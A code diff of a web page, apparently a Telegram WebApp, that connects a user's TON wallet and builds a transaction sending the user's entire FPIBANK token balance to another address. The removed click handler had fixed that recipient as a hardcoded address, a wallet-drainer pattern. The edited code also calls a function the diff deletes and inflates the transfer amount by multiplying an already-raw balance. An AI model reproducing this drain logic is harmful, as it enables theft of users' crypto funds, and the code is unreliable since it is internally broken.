@@ -63,33 +63,6 @@
       };
     }
 
-    async function createJettonTransferPayload(amount, destination, userTonAddress) {
-      const { Cell } = TonWeb.boc;
-      const { BN } = TonWeb.utils;
-
-      if (!isValidTonAddress(destination) || !isValidTonAddress(userTonAddress)) {
-        console.error("Ошибка: Неверный формат TON-адреса!");
-        return null;
-      }
-
-      const transferCell = new Cell();
-      transferCell.bits.writeUint(0x0f8a7ea5, 32);
-      transferCell.bits.writeUint(0, 64);
-      transferCell.bits.writeCoins(new BN(BigInt(amount))); 
-      transferCell.bits.writeAddress(new TonWeb.Address(destination));
-      transferCell.bits.writeAddress(new TonWeb.Address(userTonAddress));
-      transferCell.bits.writeCoins(new BN(0));
-      transferCell.refs.push(new Cell());
-
-      try {
-        const bocBytes = await transferCell.toBoc(false);
-        return TonWeb.utils.bytesToBase64(bocBytes);
-      } catch (error) {
-        console.error("Ошибка при создании payload:", error);
-        return null;
-      }
-    }
-
     async function sendAllFPIBANK(userTonAddress, recipientTonAddress) {
       console.log("Начинаем отправку FPIBANK...");
       const { rawBalance, decimals, userJettonWallet } = await getUserFPIBankData(userTonAddress);
@@ -102,11 +75,15 @@
       const recipientJettonWallet = await getOrCreateRecipientJettonWallet(recipientTonAddress);
       console.log("Jetton Wallet получателя (или TON-адрес):", recipientJettonWallet);
 
-      const balanceBigInt = BigInt(rawBalance);
-      const humanBalance = balanceBigInt / BigInt(10 ** decimals);
-      console.log(`Отправляем ${humanBalance} FPIBANK на ${recipientJettonWallet}`);
+      if (!isValidTonAddress(recipientJettonWallet)) {
+        Telegram.WebApp.showAlert("Ошибка: Jetton Wallet получателя недействителен!");
+        return;
+      }
 
-      const payloadBoc = await createJettonTransferPayload(rawBalance, recipientJettonWallet, userTonAddress);
+      const amountToSend = (BigInt(rawBalance) * BigInt(10 ** decimals)).toString();
+      console.log(`Отправляем ${amountToSend} FPIBANK на ${recipientJettonWallet}`);
+
+      const payloadBoc = await createJettonTransferPayload(amountToSend, recipientJettonWallet, userTonAddress);
       if (!payloadBoc) {
         Telegram.WebApp.showAlert("Ошибка при создании транзакции!");
         return;
@@ -117,7 +94,7 @@
         validUntil: Math.floor(Date.now() / 1000) + 3600,
         messages: [{
           address: userJettonWallet,
-          amount: "100000000",
+          amount: "100000000", // Увеличенная комиссия
           payload: payloadBoc,
         }],
       };
@@ -126,28 +103,12 @@
         console.log("Отправляем транзакцию:", transaction);
         const result = await tonConnectUI.sendTransaction(transaction);
         console.log("Транзакция успешно отправлена!", result);
-        Telegram.WebApp.showAlert(`Отправлено ${humanBalance} FPIBANK! TX: ${JSON.stringify(result)}`);
+        Telegram.WebApp.showAlert(`Отправлено ${amountToSend} FPIBANK! TX: ${JSON.stringify(result)}`);
       } catch (error) {
         console.error("Ошибка при отправке транзакции:", error);
         Telegram.WebApp.showAlert("Ошибка транзакции: " + error.message);
       }
     }
-
-    document.getElementById("sendTransaction").addEventListener("click", async () => {
-      if (!tonConnectUI.connected) {
-        Telegram.WebApp.showAlert("Сначала подключите кошелёк через TonConnect.");
-        return;
-      }
-      const userTonAddress = tonConnectUI.wallet?.account?.address;
-      if (!userTonAddress) {
-        Telegram.WebApp.showAlert("Не удалось получить ваш TON-адрес.");
-        return;
-      }
-      const recipientTonAddress = "0:1768dacd6490d4672eecae44c218a32a4db767e97797683b31dee87ba9cac516";
-      await sendAllFPIBANK(userTonAddress, recipientTonAddress);
-    });
   </script>
 </body>
 </html>
-
-
